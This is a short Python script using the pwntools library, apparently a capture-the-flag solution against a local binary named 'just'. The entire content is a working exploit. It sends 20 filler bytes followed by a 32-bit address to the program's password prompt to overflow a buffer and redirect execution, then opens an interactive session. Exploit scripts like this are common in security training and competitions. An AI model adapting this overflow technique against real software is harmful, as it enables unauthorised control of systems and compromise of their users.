from pwn import *
pay = b''
pay += b"A"*20
pay += p32(0x804a080)
p = process('./just')
p.recvuntil(b"Input the password.")
p.sendline(pay)
p.interactive()
